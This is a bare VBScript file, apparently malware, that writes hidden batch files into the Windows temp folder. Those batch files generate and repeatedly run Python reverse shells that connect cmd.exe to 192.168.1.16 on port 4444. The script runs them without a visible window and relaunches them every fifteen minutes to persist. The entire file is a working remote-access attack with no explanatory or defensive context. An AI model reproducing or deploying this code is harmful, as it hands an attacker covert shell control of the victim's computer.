Dim temp
temp = "%temp%" 
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Do
        If fso.FileExists(temp & "\pro1.bat") Then
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp & "\pro1.bat", 0, False
        Else
            Dim temp_dir
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro1.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh1.py"
            objFile.WriteLine "if not exist %FILE% ("
            objFile.WriteLine "    ("
            objFile.WriteLine "        echo import socket"
            objFile.WriteLine "        echo import os"
            objFile.WriteLine "        echo import threading"
            objFile.WriteLine "        echo import subprocess as sp"
            objFile.WriteLine "        echo import time"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo def rev^(^)^:"
            objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
            objFile.WriteLine "        echo    s = socket.socket^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    try:"
            objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
            objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
            objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
            objFile.WriteLine "        echo        return"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def s_o^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                output = os.read^(p.stdout.fileno^(^), 1024^)"
            objFile.WriteLine "        echo                if not output^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                s.sendall^(output^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error sending output:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def r_i^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                data = s.recv^(1024^)"
            objFile.WriteLine "        echo                if not data^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                p.stdin.write^(data^)"
            objFile.WriteLine "        echo                p.stdin.flush^(^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error receiving input:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
            objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    time.sleep^(40^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo while True^:"
            objFile.WriteLine "        echo    rev^(^)"
            objFile.WriteLine "        echo    print^('Loading ...'^)"
            objFile.WriteLine "    ) > %FILE%"
            objFile.WriteLine ") else ("
            objFile.WriteLine "   python %FILE%"
            objFile.WriteLine "   timeout /t 80 >nul"
            objFile.WriteLine ")"
            objFile.WriteLine "goto loop"

            objFile.Close
            objShell.Run temp_dir & "\pro1.bat", 0, False
        End If
        If fso.FileExists(temp_dir & "\pro.bat") Then
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run temp_dir & "\pro.bat", 0, False
        Else
            Set objShell = CreateObject("WScript.Shell")
            temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
            objShell.CurrentDirectory = temp_dir
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFSO.CreateTextFile(temp_dir & "\pro.bat")
            objFile.WriteLine "@echo off"
            objFile.WriteLine ":loop"
            objFile.WriteLine "set FILE=%temp%\sh.py"
            objFile.WriteLine "if not exist %FILE% ("
            objFile.WriteLine "    ("
            objFile.WriteLine "        echo import socket"
            objFile.WriteLine "        echo import os"
            objFile.WriteLine "        echo import threading"
            objFile.WriteLine "        echo import subprocess as sp"
            objFile.WriteLine "        echo import time"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo def rev^(^)^:"
            objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
            objFile.WriteLine "        echo    s = socket.socket^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    try:"
            objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
            objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
            objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
            objFile.WriteLine "        echo        return"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def s_o^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                output = os.read^(p.stdout.fileno^(^), 1024^)"
            objFile.WriteLine "        echo                if not output^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                s.sendall^(output^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error sending output:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    def r_i^(^)^:"
            objFile.WriteLine "        echo        while True^:"
            objFile.WriteLine "        echo            try^:"
            objFile.WriteLine "        echo                data = s.recv^(1024^)"
            objFile.WriteLine "        echo                if not data^:"
            objFile.WriteLine "        echo                    break"
            objFile.WriteLine "        echo                p.stdin.write^(data^)"
            objFile.WriteLine "        echo                p.stdin.flush^(^)"
            objFile.WriteLine "        echo            except Exception as e^:"
            objFile.WriteLine "        echo                print^('Error receiving input:', e^)"
            objFile.WriteLine "        echo                break"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
            objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo    time.sleep^(30^)"
            objFile.WriteLine "        echo."
            objFile.WriteLine "        echo while True^:"
            objFile.WriteLine "        echo    rev^(^)"
            objFile.WriteLine "        echo    print^('Loading ...'^)"
            objFile.WriteLine "    ) > %FILE%"
            objFile.WriteLine ") else ("
            objFile.WriteLine "   python %FILE%"
            objFile.WriteLine "   timeout /t 60 >nul"
            objFile.WriteLine ")"
            objFile.WriteLine "goto loop"

            objFile.Close
            objShell.Run temp_dir & "\pro.bat", 0, False
        End If
        WScript.Sleep 900000
Loop
